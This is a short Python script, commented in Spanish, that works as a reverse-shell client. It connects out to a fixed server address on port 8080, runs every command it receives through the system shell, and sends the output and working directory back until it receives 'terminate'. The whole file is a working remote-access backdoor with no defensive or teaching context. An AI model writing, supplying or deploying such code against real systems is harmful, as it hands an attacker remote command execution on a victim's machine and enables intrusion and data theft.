import socket
import os
import subprocess

# Direccion IP del servidor
target_host = "192.168.1.114"
# Puerto de conexion al servidor
target_port = 8080

# Definicion del socket
client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# Iniciar conexion
client.connect((target_host,target_port))

while True:
    # Recibir comando
    data = client.recv(4096)

    # Si es la palabra terminate, se termina la conexion y el programa
    if data.decode("utf-8") == 'terminate':
        client.close()
        break
    # Si el comando es cd, se ejecuta a nivel sistema operativo
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
        client.send(str.encode(str(os.getcwd()) + '\n'))
    elif len(data) > 0:
        # Se inicia un subproceso para formar el comando
        cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        # Se obtiene el resultado de la ejecucion del comando
        output_bytes = cmd.stdout.read()
        output_str = output_bytes.decode("latin-1")
        # Se envia el resultado del comando al servidor
        client.send(str.encode(output_str + str(os.getcwd()) + '\n'))
